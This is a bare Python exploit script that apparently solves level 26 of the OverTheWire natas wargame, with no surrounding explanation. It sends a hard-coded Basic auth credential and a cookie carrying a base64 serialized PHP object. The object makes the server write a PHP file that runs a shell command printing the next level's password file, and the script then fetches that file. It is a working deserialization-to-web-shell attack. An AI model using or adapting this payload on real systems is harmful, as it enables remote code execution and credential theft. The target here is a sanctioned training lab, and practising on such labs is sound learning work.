import requests

headers = {
    'Authorization': 'Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA=='
}

cookies = {
    'PHPSESSID': 'hellofriend',
    'drawing': 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMDoiaW1nL2hlbGxvX2ZyaWVuZC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30'
}

with requests.Session() as session:
    url = f"http://natas26.natas.labs.overthewire.org/"

    request = session.get(url=url, headers=headers, cookies=cookies)

    content = request.content.decode('utf-8')

    print(content)

    url = f"http://natas26.natas.labs.overthewire.org/img/hello_friend.php"

    request = session.get(url=url, headers=headers, cookies=cookies)

    content = request.content.decode('utf-8')

    print(content)
